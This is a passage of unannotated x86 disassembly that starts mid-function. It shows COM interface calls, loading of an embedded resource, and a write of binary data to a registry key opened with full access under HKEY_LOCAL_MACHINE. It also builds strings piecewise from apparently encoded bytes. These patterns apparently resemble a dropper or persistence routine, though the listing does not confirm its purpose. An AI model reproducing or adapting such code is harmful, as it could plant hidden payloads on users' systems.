  4015b9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4015ba:	8b fc                	mov    %esp,%edi
  4015bc:	8d 75 d8             	lea    -0x28(%ebp),%esi
  4015bf:	83 ec 10             	sub    $0x10,%esp
  4015c2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4015c3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4015c4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4015c5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4015c6:	8b fc                	mov    %esp,%edi
  4015c8:	8d 75 d8             	lea    -0x28(%ebp),%esi
  4015cb:	50                   	push   %eax
  4015cc:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4015cd:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4015ce:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4015cf:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4015d0:	ff 51 28             	call   *0x28(%ecx)
  4015d3:	85 c0                	test   %eax,%eax
  4015d5:	78 76                	js     0x40164d
  4015d7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4015da:	8d 55 f4             	lea    -0xc(%ebp),%edx
  4015dd:	52                   	push   %edx
  4015de:	ff 75 e8             	push   -0x18(%ebp)
  4015e1:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  4015e4:	8b 08                	mov    (%eax),%ecx
  4015e6:	50                   	push   %eax
  4015e7:	ff 51 1c             	call   *0x1c(%ecx)
  4015ea:	85 c0                	test   %eax,%eax
  4015ec:	78 5f                	js     0x40164d
  4015ee:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4015f1:	8d 55 f8             	lea    -0x8(%ebp),%edx
  4015f4:	52                   	push   %edx
  4015f5:	ff 75 ec             	push   -0x14(%ebp)
  4015f8:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4015fb:	8b 08                	mov    (%eax),%ecx
  4015fd:	50                   	push   %eax
  4015fe:	ff 51 34             	call   *0x34(%ecx)
  401601:	85 c0                	test   %eax,%eax
  401603:	78 3f                	js     0x401644
  401605:	8d 45 c8             	lea    -0x38(%ebp),%eax
  401608:	50                   	push   %eax
  401609:	ff 15 54 20 40 00    	call   *0x402054
  40160f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401612:	8d 55 f0             	lea    -0x10(%ebp),%edx
  401615:	52                   	push   %edx
  401616:	83 ec 10             	sub    $0x10,%esp
  401619:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  40161c:	8b fc                	mov    %esp,%edi
  40161e:	8d 75 c8             	lea    -0x38(%ebp),%esi
  401621:	8b 08                	mov    (%eax),%ecx
  401623:	50                   	push   %eax
  401624:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401625:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401626:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401627:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401628:	ff 51 30             	call   *0x30(%ecx)
  40162b:	85 c0                	test   %eax,%eax
  40162d:	78 0c                	js     0x40163b
  40162f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401632:	33 db                	xor    %ebx,%ebx
  401634:	50                   	push   %eax
  401635:	43                   	inc    %ebx
  401636:	8b 08                	mov    (%eax),%ecx
  401638:	ff 51 08             	call   *0x8(%ecx)
  40163b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40163e:	50                   	push   %eax
  40163f:	8b 08                	mov    (%eax),%ecx
  401641:	ff 51 08             	call   *0x8(%ecx)
  401644:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401647:	50                   	push   %eax
  401648:	8b 08                	mov    (%eax),%ecx
  40164a:	ff 51 08             	call   *0x8(%ecx)
  40164d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401650:	50                   	push   %eax
  401651:	8b 08                	mov    (%eax),%ecx
  401653:	ff 51 08             	call   *0x8(%ecx)
  401656:	8b 7d ec             	mov    -0x14(%ebp),%edi
  401659:	ff 15 7c 20 40 00    	call   *0x40207c
  40165f:	8b 35 50 20 40 00    	mov    0x402050,%esi
  401665:	57                   	push   %edi
  401666:	ff d6                	call   *%esi
  401668:	ff 75 e8             	push   -0x18(%ebp)
  40166b:	ff d6                	call   *%esi
  40166d:	5f                   	pop    %edi
  40166e:	5e                   	pop    %esi
  40166f:	8b c3                	mov    %ebx,%eax
  401671:	5b                   	pop    %ebx
  401672:	c9                   	leave
  401673:	c3                   	ret
  401674:	55                   	push   %ebp
  401675:	8b ec                	mov    %esp,%ebp
  401677:	83 ec 20             	sub    $0x20,%esp
  40167a:	53                   	push   %ebx
  40167b:	56                   	push   %esi
  40167c:	8b 35 58 20 40 00    	mov    0x402058,%esi
  401682:	33 db                	xor    %ebx,%ebx
  401684:	57                   	push   %edi
  401685:	51                   	push   %ecx
  401686:	ff d6                	call   *%esi
  401688:	68 8c 21 40 00       	push   $0x40218c
  40168d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401690:	ff d6                	call   *%esi
  401692:	53                   	push   %ebx
  401693:	8b f8                	mov    %eax,%edi
  401695:	53                   	push   %ebx
  401696:	89 7d f0             	mov    %edi,-0x10(%ebp)
  401699:	ff 15 80 20 40 00    	call   *0x402080
  40169f:	85 c0                	test   %eax,%eax
  4016a1:	0f 88 db 00 00 00    	js     0x401782
  4016a7:	53                   	push   %ebx
  4016a8:	53                   	push   %ebx
  4016a9:	53                   	push   %ebx
  4016aa:	6a 03                	push   $0x3
  4016ac:	6a 06                	push   $0x6
  4016ae:	53                   	push   %ebx
  4016af:	53                   	push   %ebx
  4016b0:	6a ff                	push   $0xffffffff
  4016b2:	53                   	push   %ebx
  4016b3:	ff 15 74 20 40 00    	call   *0x402074
  4016b9:	85 c0                	test   %eax,%eax
  4016bb:	79 0b                	jns    0x4016c8
  4016bd:	3d 19 01 01 80       	cmp    $0x80010119,%eax
  4016c2:	0f 85 af 00 00 00    	jne    0x401777
  4016c8:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4016cb:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4016ce:	50                   	push   %eax
  4016cf:	68 88 20 40 00       	push   $0x402088
  4016d4:	6a 01                	push   $0x1
  4016d6:	53                   	push   %ebx
  4016d7:	68 a8 20 40 00       	push   $0x4020a8
  4016dc:	ff 15 78 20 40 00    	call   *0x402078
  4016e2:	85 c0                	test   %eax,%eax
  4016e4:	0f 88 8d 00 00 00    	js     0x401777
  4016ea:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4016ed:	50                   	push   %eax
  4016ee:	ff 15 54 20 40 00    	call   *0x402054
  4016f4:	83 ec 10             	sub    $0x10,%esp
  4016f7:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4016fa:	8b fc                	mov    %esp,%edi
  4016fc:	8d 75 e0             	lea    -0x20(%ebp),%esi
  4016ff:	83 ec 10             	sub    $0x10,%esp
  401702:	8b 08                	mov    (%eax),%ecx
  401704:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401705:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401706:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401707:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401708:	8b fc                	mov    %esp,%edi
  40170a:	8d 75 e0             	lea    -0x20(%ebp),%esi
  40170d:	83 ec 10             	sub    $0x10,%esp
  401710:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401711:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401712:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401713:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401714:	8b fc                	mov    %esp,%edi
  401716:	8d 75 e0             	lea    -0x20(%ebp),%esi
  401719:	83 ec 10             	sub    $0x10,%esp
  40171c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40171d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40171e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40171f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401720:	8b fc                	mov    %esp,%edi
  401722:	8d 75 e0             	lea    -0x20(%ebp),%esi
  401725:	50                   	push   %eax
  401726:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401727:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401728:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401729:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40172a:	ff 51 28             	call   *0x28(%ecx)
  40172d:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401730:	85 c0                	test   %eax,%eax
  401732:	78 35                	js     0x401769
  401734:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401737:	8d 55 f4             	lea    -0xc(%ebp),%edx
  40173a:	52                   	push   %edx
  40173b:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  40173e:	57                   	push   %edi
  40173f:	8b 08                	mov    (%eax),%ecx
  401741:	50                   	push   %eax
  401742:	ff 51 1c             	call   *0x1c(%ecx)
  401745:	8b 75 fc             	mov    -0x4(%ebp),%esi
  401748:	85 c0                	test   %eax,%eax
  40174a:	78 20                	js     0x40176c
  40174c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40174f:	53                   	push   %ebx
  401750:	56                   	push   %esi
  401751:	50                   	push   %eax
  401752:	8b 08                	mov    (%eax),%ecx
  401754:	ff 51 3c             	call   *0x3c(%ecx)
  401757:	8b d8                	mov    %eax,%ebx
  401759:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40175c:	50                   	push   %eax
  40175d:	8b 08                	mov    (%eax),%ecx
  40175f:	ff 51 08             	call   *0x8(%ecx)
  401762:	f7 d3                	not    %ebx
  401764:	c1 eb 1f             	shr    $0x1f,%ebx
  401767:	eb 03                	jmp    0x40176c
  401769:	8b 75 fc             	mov    -0x4(%ebp),%esi
  40176c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40176f:	50                   	push   %eax
  401770:	8b 08                	mov    (%eax),%ecx
  401772:	ff 51 08             	call   *0x8(%ecx)
  401775:	eb 03                	jmp    0x40177a
  401777:	8b 75 fc             	mov    -0x4(%ebp),%esi
  40177a:	ff 15 7c 20 40 00    	call   *0x40207c
  401780:	eb 03                	jmp    0x401785
  401782:	8b 75 fc             	mov    -0x4(%ebp),%esi
  401785:	56                   	push   %esi
  401786:	8b 35 50 20 40 00    	mov    0x402050,%esi
  40178c:	ff d6                	call   *%esi
  40178e:	57                   	push   %edi
  40178f:	ff d6                	call   *%esi
  401791:	5f                   	pop    %edi
  401792:	5e                   	pop    %esi
  401793:	8b c3                	mov    %ebx,%eax
  401795:	5b                   	pop    %ebx
  401796:	c9                   	leave
  401797:	c3                   	ret
  401798:	e8 08 00 00 00       	call   0x4017a5
  40179d:	50                   	push   %eax
  40179e:	ff 15 34 20 40 00    	call   *0x402034
  4017a4:	cc                   	int3
  4017a5:	55                   	push   %ebp
  4017a6:	8b ec                	mov    %esp,%ebp
  4017a8:	51                   	push   %ecx
  4017a9:	53                   	push   %ebx
  4017aa:	56                   	push   %esi
  4017ab:	68 bc 21 40 00       	push   $0x4021bc
  4017b0:	6a 65                	push   $0x65
  4017b2:	33 db                	xor    %ebx,%ebx
  4017b4:	53                   	push   %ebx
  4017b5:	ff 15 20 20 40 00    	call   *0x402020
  4017bb:	8b f0                	mov    %eax,%esi
  4017bd:	85 f6                	test   %esi,%esi
  4017bf:	0f 84 9d 00 00 00    	je     0x401862
  4017c5:	57                   	push   %edi
  4017c6:	56                   	push   %esi
  4017c7:	53                   	push   %ebx
  4017c8:	ff 15 18 20 40 00    	call   *0x402018
  4017ce:	8b f8                	mov    %eax,%edi
  4017d0:	85 ff                	test   %edi,%edi
  4017d2:	0f 84 89 00 00 00    	je     0x401861
  4017d8:	56                   	push   %esi
  4017d9:	53                   	push   %ebx
  4017da:	ff 15 48 20 40 00    	call   *0x402048
  4017e0:	85 c0                	test   %eax,%eax
  4017e2:	74 7d                	je     0x401861
  4017e4:	50                   	push   %eax
  4017e5:	ff 15 28 20 40 00    	call   *0x402028
  4017eb:	8b f0                	mov    %eax,%esi
  4017ed:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4017f0:	50                   	push   %eax
  4017f1:	68 3f 01 0f 00       	push   $0xf013f
  4017f6:	53                   	push   %ebx
  4017f7:	68 c0 21 40 00       	push   $0x4021c0
  4017fc:	68 02 00 00 80       	push   $0x80000002
  401801:	ff 15 0c 20 40 00    	call   *0x40200c
  401807:	85 c0                	test   %eax,%eax
  401809:	75 56                	jne    0x401861
  40180b:	57                   	push   %edi
  40180c:	56                   	push   %esi
  40180d:	6a 03                	push   $0x3
  40180f:	53                   	push   %ebx
  401810:	68 d4 21 40 00       	push   $0x4021d4
  401815:	ff 75 fc             	push   -0x4(%ebp)
  401818:	ff 15 00 20 40 00    	call   *0x402000
  40181e:	85 c0                	test   %eax,%eax
  401820:	75 3f                	jne    0x401861
  401822:	e8 41 00 00 00       	call   0x401868
  401827:	bb e8 21 40 00       	mov    $0x4021e8,%ebx
  40182c:	8b f0                	mov    %eax,%esi
  40182e:	8b cb                	mov    %ebx,%ecx
  401830:	e8 3f fe ff ff       	call   0x401674
  401835:	bf fc 21 40 00       	mov    $0x4021fc,%edi
  40183a:	8b cf                	mov    %edi,%ecx
  40183c:	e8 33 fe ff ff       	call   0x401674
  401841:	e8 e9 f8 ff ff       	call   0x40112f
  401846:	85 c0                	test   %eax,%eax
  401848:	56                   	push   %esi
  401849:	0f 44 fb             	cmove  %ebx,%edi
  40184c:	51                   	push   %ecx
  40184d:	8b cf                	mov    %edi,%ecx
  40184f:	e8 59 f9 ff ff       	call   0x4011ad
  401854:	59                   	pop    %ecx
  401855:	59                   	pop    %ecx
  401856:	85 c0                	test   %eax,%eax
  401858:	74 07                	je     0x401861
  40185a:	8b cf                	mov    %edi,%ecx
  40185c:	e8 b9 fc ff ff       	call   0x40151a
  401861:	5f                   	pop    %edi
  401862:	5e                   	pop    %esi
  401863:	33 c0                	xor    %eax,%eax
  401865:	5b                   	pop    %ebx
  401866:	c9                   	leave
  401867:	c3                   	ret
  401868:	53                   	push   %ebx
  401869:	56                   	push   %esi
  40186a:	57                   	push   %edi
  40186b:	68 00 80 00 00       	push   $0x8000
  401870:	6a 00                	push   $0x0
  401872:	ff 15 38 20 40 00    	call   *0x402038
  401878:	50                   	push   %eax
  401879:	ff 15 3c 20 40 00    	call   *0x40203c
  40187f:	bb 2c 22 40 00       	mov    $0x40222c,%ebx
  401884:	8b f0                	mov    %eax,%esi
  401886:	53                   	push   %ebx
  401887:	56                   	push   %esi
  401888:	ff 15 6c 20 40 00    	call   *0x40206c
  40188e:	e8 c6 f8 ff ff       	call   0x401159
  401893:	8b 3d 68 20 40 00    	mov    0x402068,%edi
  401899:	85 c0                	test   %eax,%eax
  40189b:	74 28                	je     0x4018c5
  40189d:	68 30 22 40 00       	push   $0x402230
  4018a2:	56                   	push   %esi
  4018a3:	ff d7                	call   *%edi
  4018a5:	e8 85 f8 ff ff       	call   0x40112f
  4018aa:	85 c0                	test   %eax,%eax
  4018ac:	74 07                	je     0x4018b5
  4018ae:	68 20 32 40 00       	push   $0x403220
  4018b3:	eb 05                	jmp    0x4018ba
  4018b5:	68 e8 32 40 00       	push   $0x4032e8
  4018ba:	56                   	push   %esi
  4018bb:	ff d7                	call   *%edi
  4018bd:	68 c0 33 40 00       	push   $0x4033c0
  4018c2:	56                   	push   %esi
  4018c3:	ff d7                	call   *%edi
  4018c5:	68 18 35 40 00       	push   $0x403518
  4018ca:	56                   	push   %esi
  4018cb:	ff d7                	call   *%edi
  4018cd:	53                   	push   %ebx
  4018ce:	56                   	push   %esi
  4018cf:	ff d7                	call   *%edi
  4018d1:	8b ce                	mov    %esi,%ecx
  4018d3:	e8 09 01 00 00       	call   0x4019e1
  4018d8:	ba 3c 36 40 00       	mov    $0x40363c,%edx
  4018dd:	8b ce                	mov    %esi,%ecx
  4018df:	e8 a2 00 00 00       	call   0x401986
  4018e4:	ba 58 36 40 00       	mov    $0x403658,%edx
  4018e9:	8b ce                	mov    %esi,%ecx
  4018eb:	e8 96 00 00 00       	call   0x401986
  4018f0:	ba 78 36 40 00       	mov    $0x403678,%edx
  4018f5:	8b ce                	mov    %esi,%ecx
  4018f7:	e8 8a 00 00 00       	call   0x401986
  4018fc:	ba 90 36 40 00       	mov    $0x403690,%edx
  401901:	8b ce                	mov    %esi,%ecx
  401903:	e8 7e 00 00 00       	call   0x401986
  401908:	ba a8 36 40 00       	mov    $0x4036a8,%edx
  40190d:	8b ce                	mov    %esi,%ecx
  40190f:	e8 72 00 00 00       	call   0x401986
  401914:	ba c4 36 40 00       	mov    $0x4036c4,%edx
  401919:	8b ce                	mov    %esi,%ecx
  40191b:	e8 66 00 00 00       	call   0x401986
  401920:	ba e4 36 40 00       	mov    $0x4036e4,%edx
  401925:	8b ce                	mov    %esi,%ecx
  401927:	e8 5a 00 00 00       	call   0x401986
  40192c:	ba 0c 37 40 00       	mov    $0x40370c,%edx
  401931:	8b ce                	mov    %esi,%ecx
  401933:	e8 4e 00 00 00       	call   0x401986
  401938:	ba 3c 37 40 00       	mov    $0x40373c,%edx
  40193d:	8b ce                	mov    %esi,%ecx
  40193f:	e8 42 00 00 00       	call   0x401986
  401944:	ba 54 37 40 00       	mov    $0x403754,%edx
  401949:	8b ce                	mov    %esi,%ecx
  40194b:	e8 36 00 00 00       	call   0x401986
  401950:	ba 74 37 40 00       	mov    $0x403774,%edx
  401955:	8b ce                	mov    %esi,%ecx
  401957:	e8 2a 00 00 00       	call   0x401986
  40195c:	ba 98 37 40 00       	mov    $0x403798,%edx
  401961:	8b ce                	mov    %esi,%ecx
  401963:	e8 1e 00 00 00       	call   0x401986
  401968:	ba a8 37 40 00       	mov    $0x4037a8,%edx
  40196d:	8b ce                	mov    %esi,%ecx
  40196f:	e8 12 00 00 00       	call   0x401986
  401974:	ba cc 37 40 00       	mov    $0x4037cc,%edx
  401979:	8b ce                	mov    %esi,%ecx
  40197b:	e8 06 00 00 00       	call   0x401986
  401980:	5f                   	pop    %edi
  401981:	8b c6                	mov    %esi,%eax
  401983:	5e                   	pop    %esi
  401984:	5b                   	pop    %ebx
  401985:	c3                   	ret
  401986:	55                   	push   %ebp
  401987:	8b ec                	mov    %esp,%ebp
  401989:	81 ec d0 00 00 00    	sub    $0xd0,%esp
  40198f:	53                   	push   %ebx
  401990:	56                   	push   %esi
  401991:	8b da                	mov    %edx,%ebx
  401993:	8b f1                	mov    %ecx,%esi
  401995:	53                   	push   %ebx
  401996:	89 75 f8             	mov    %esi,-0x8(%ebp)
  401999:	ff 15 40 20 40 00    	call   *0x402040
  40199f:	8b d0                	mov    %eax,%edx
  4019a1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4019a4:	8d 8d 30 ff ff ff    	lea    -0xd0(%ebp),%ecx
  4019aa:	e8 9c f6 ff ff       	call   0x40104b
  4019af:	85 c0                	test   %eax,%eax
  4019b1:	74 2a                	je     0x4019dd
  4019b3:	53                   	push   %ebx
  4019b4:	56                   	push   %esi
  4019b5:	ff 15 64 20 40 00    	call   *0x402064
  4019bb:	85 c0                	test   %eax,%eax
  4019bd:	74 1e                	je     0x4019dd
  4019bf:	57                   	push   %edi
  4019c0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4019c3:	8d b5 30 ff ff ff    	lea    -0xd0(%ebp),%esi
  4019c9:	53                   	push   %ebx
  4019ca:	ff 75 f8             	push   -0x8(%ebp)
  4019cd:	8b f8                	mov    %eax,%edi
  4019cf:	66 f3 a5             	rep movsw %ds:(%esi),%es:(%edi)
  4019d2:	ff 15 64 20 40 00    	call   *0x402064
  4019d8:	85 c0                	test   %eax,%eax
  4019da:	75 e4                	jne    0x4019c0
  4019dc:	5f                   	pop    %edi
  4019dd:	5e                   	pop    %esi
  4019de:	5b                   	pop    %ebx
  4019df:	c9                   	leave
  4019e0:	c3                   	ret
  4019e1:	55                   	push   %ebp
  4019e2:	8b ec                	mov    %esp,%ebp
  4019e4:	83 ec 60             	sub    $0x60,%esp
  4019e7:	53                   	push   %ebx
  4019e8:	56                   	push   %esi
  4019e9:	57                   	push   %edi
  4019ea:	68 00 80 00 00       	push   $0x8000
  4019ef:	6a 00                	push   $0x0
  4019f1:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4019f4:	ff 15 38 20 40 00    	call   *0x402038
  4019fa:	8b 35 3c 20 40 00    	mov    0x40203c,%esi
  401a00:	50                   	push   %eax
  401a01:	ff d6                	call   *%esi
  401a03:	8b d8                	mov    %eax,%ebx
  401a05:	ba 00 40 00 00       	mov    $0x4000,%edx
  401a0a:	33 c0                	xor    %eax,%eax
  401a0c:	8b ca                	mov    %edx,%ecx
  401a0e:	52                   	push   %edx
  401a0f:	8b fb                	mov    %ebx,%edi
  401a11:	66 f3 ab             	rep stos %ax,%es:(%edi)
  401a14:	50                   	push   %eax
  401a15:	ff 15 38 20 40 00    	call   *0x402038
  401a1b:	50                   	push   %eax
  401a1c:	ff d6                	call   *%esi
  401a1e:	8b f0                	mov    %eax,%esi
  401a20:	ba 00 40 00 00       	mov    $0x4000,%edx
  401a25:	8b ce                	mov    %esi,%ecx
  401a27:	89 75 dc             	mov    %esi,-0x24(%ebp)
  401a2a:	e8 d1 f5 ff ff       	call   0x401000
  401a2f:	85 c0                	test   %eax,%eax
  401a31:	0f 84 67 01 00 00    	je     0x401b9e
  401a37:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401a3a:	68 e4 37 40 00       	push   $0x4037e4
  401a3f:	50                   	push   %eax
  401a40:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401a43:	89 75 f4             	mov    %esi,-0xc(%ebp)
  401a46:	ff 15 64 20 40 00    	call   *0x402064
  401a4c:	8b 35 68 20 40 00    	mov    0x402068,%esi
  401a52:	e9 10 01 00 00       	jmp    0x401b67
  401a57:	8b c7                	mov    %edi,%eax
  401a59:	2b 45 fc             	sub    -0x4(%ebp),%eax
  401a5c:	d1 f8                	sar    $1,%eax
  401a5e:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401a61:	8d 47 02             	lea    0x2(%edi),%eax
  401a64:	68 e4 37 40 00       	push   $0x4037e4
  401a69:	50                   	push   %eax
  401a6a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401a6d:	ff 15 64 20 40 00    	call   *0x402064
  401a73:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  401a76:	2b c7                	sub    %edi,%eax
  401a78:	41                   	inc    %ecx
  401a79:	d1 f8                	sar    $1,%eax
  401a7b:	51                   	push   %ecx
  401a7c:	ff 75 fc             	push   -0x4(%ebp)
  401a7f:	48                   	dec    %eax
  401a80:	53                   	push   %ebx
  401a81:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401a84:	ff 15 60 20 40 00    	call   *0x402060
  401a8a:	68 e8 37 40 00       	push   $0x4037e8
  401a8f:	53                   	push   %ebx
  401a90:	ff d6                	call   *%esi
  401a92:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401a95:	85 c0                	test   %eax,%eax
  401a97:	0f 84 a4 00 00 00    	je     0x401b41
  401a9d:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401aa0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401aa3:	0f b7 00             	movzwl (%eax),%eax
  401aa6:	8d 55 c8             	lea    -0x38(%ebp),%edx
  401aa9:	8b c8                	mov    %eax,%ecx
  401aab:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401aae:	e8 fe f5 ff ff       	call   0x4010b1
  401ab3:	33 c0                	xor    %eax,%eax
  401ab5:	8d 7d a0             	lea    -0x60(%ebp),%edi
  401ab8:	6a 14                	push   $0x14
  401aba:	59                   	pop    %ecx
  401abb:	66 f3 ab             	rep stos %ax,%es:(%edi)
  401abe:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401ac1:	0f b6 01             	movzbl (%ecx),%eax
  401ac4:	83 e0 03             	and    $0x3,%eax
  401ac7:	41                   	inc    %ecx
  401ac8:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401acb:	83 e8 00             	sub    $0x0,%eax
  401ace:	74 50                	je     0x401b20
  401ad0:	83 e8 01             	sub    $0x1,%eax
  401ad3:	74 26                	je     0x401afb
  401ad5:	83 e8 01             	sub    $0x1,%eax
  401ad8:	74 05                	je     0x401adf
  401ada:	83 e8 01             	sub    $0x1,%eax
  401add:	75 48                	jne    0x401b27
  401adf:	68 f4 37 40 00       	push   $0x4037f4
  401ae4:	8d 45 a0             	lea    -0x60(%ebp),%eax
  401ae7:	50                   	push   %eax
  401ae8:	ff d6                	call   *%esi
  401aea:	8d 45 c8             	lea    -0x38(%ebp),%eax
  401aed:	50                   	push   %eax
  401aee:	8d 45 a0             	lea    -0x60(%ebp),%eax
  401af1:	50                   	push   %eax
  401af2:	ff d6                	call   *%esi
  401af4:	68 08 38 40 00       	push   $0x403808
  401af9:	eb 1d                	jmp    0x401b18
  401afb:	bf ec 37 40 00       	mov    $0x4037ec,%edi
  401b00:	8d 45 a0             	lea    -0x60(%ebp),%eax
  401b03:	57                   	push   %edi
  401b04:	50                   	push   %eax
  401b05:	ff d6                	call   *%esi
  401b07:	6a 02                	push   $0x2
  401b09:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401b0c:	50                   	push   %eax
  401b0d:	8d 45 a0             	lea    -0x60(%ebp),%eax
  401b10:	50                   	push   %eax
  401b11:	ff 15 60 20 40 00    	call   *0x402060
  401b17:	57                   	push   %edi
  401b18:	8d 45 a0             	lea    -0x60(%ebp),%eax
  401b1b:	50                   	push   %eax
  401b1c:	ff d6                	call   *%esi
  401b1e:	eb 07                	jmp    0x401b27
  401b20:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401b23:	66 89 45 a0          	mov    %ax,-0x60(%ebp)
  401b27:	8d 45 a0             	lea    -0x60(%ebp),%eax
  401b2a:	50                   	push   %eax
  401b2b:	53                   	push   %ebx
  401b2c:	ff d6                	call   *%esi
  401b2e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401b31:	83 c0 02             	add    $0x2,%eax
  401b34:	83 6d ec 01          	subl   $0x1,-0x14(%ebp)
  401b38:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401b3b:	0f 85 62 ff ff ff    	jne    0x401aa3
  401b41:	68 e8 37 40 00       	push   $0x4037e8
  401b46:	53                   	push   %ebx
  401b47:	ff d6                	call   *%esi
  401b49:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401b4c:	03 45 e4             	add    -0x1c(%ebp),%eax
  401b4f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401b52:	68 e4 37 40 00       	push   $0x4037e4
  401b57:	8d 0c 41             	lea    (%ecx,%eax,2),%ecx
  401b5a:	83 c1 04             	add    $0x4,%ecx
  401b5d:	51                   	push   %ecx
  401b5e:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401b61:	ff 15 64 20 40 00    	call   *0x402064
  401b67:	8b f8                	mov    %eax,%edi
  401b69:	85 ff                	test   %edi,%edi
  401b6b:	0f 85 e6 fe ff ff    	jne    0x401a57
  401b71:	ff 75 fc             	push   -0x4(%ebp)
  401b74:	53                   	push   %ebx
  401b75:	ff d6                	call   *%esi
  401b77:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  401b7a:	53                   	push   %ebx
  401b7b:	51                   	push   %ecx
  401b7c:	ff 15 6c 20 40 00    	call   *0x40206c
  401b82:	53                   	push   %ebx
  401b83:	8b 1d 38 20 40 00    	mov    0x402038,%ebx
  401b89:	57                   	push   %edi
  401b8a:	ff d3                	call   *%ebx
  401b8c:	8b 35 44 20 40 00    	mov    0x402044,%esi
  401b92:	50                   	push   %eax
  401b93:	ff d6                	call   *%esi
  401b95:	ff 75 dc             	push   -0x24(%ebp)
  401b98:	57                   	push   %edi
  401b99:	ff d3                	call   *%ebx
  401b9b:	50                   	push   %eax
  401b9c:	ff d6                	call   *%esi
  401b9e:	5f                   	pop    %edi
  401b9f:	5e                   	pop    %esi
  401ba0:	5b                   	pop    %ebx
  401ba1:	c9                   	leave
  401ba2:	c3                   	ret
